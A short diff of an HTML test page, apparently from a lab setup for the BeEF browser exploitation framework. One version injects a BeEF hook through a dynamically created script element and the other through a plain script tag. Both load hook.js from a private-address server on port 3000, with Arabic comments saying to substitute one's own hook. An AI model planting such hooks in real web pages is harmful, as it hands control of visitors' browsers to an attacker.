@@ -4,15 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Test Page</title>
-    <script>
-        // الكود المراد حقنه
-        var script = document.createElement('script');
-        script.src = 'http://10.0.2.15:3000/hook.js'; // استبدل بالـ hook الخاص بك
-        document.head.appendChild(script);
-    </script>
 </head>
 <body>
-    <h1>Welcome to My Test Page</h1>
-    <p>This page is for testing BeEF hook.</p>
+    <h1>Welcome to the test page</h1>
+    <!-- تضمين hook.js -->
+    <script src="http://10.0.2.15:3000/hook.js"></script>
 </body>
 </html>
